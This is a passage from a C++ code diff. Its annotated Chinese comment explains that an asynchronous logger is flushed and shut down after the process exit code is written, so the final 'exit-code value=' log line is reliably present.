+                            static_cast<std::int64_t>(rejection));
+    /* ★ L7 ✓（design-critic）：异步日志**必须 drain** ✗ —— 否则最后几行（⇒ 正是判据行 ✓）可能还在队列里 ✓。
+     *  顺序由 finish() 一处保证：**先**写退出码 ✓，**再** flush ＋ shutdown ✓ ⇒ 真机日志**末尾必有**
+     *  `exit-code value=` ✓（⇒ 判据可失败：去掉 drain ⇒ 该行缺失 ⇒ 红 ✓）。
+     *  这里传的是**进程真正的退出码**（此前记的是 Lua 判定 0/10，与 rc 不一致 ✗）。 */
+    return finish(rejection == script::ScriptRejection::None ? 0 : 10);
 }
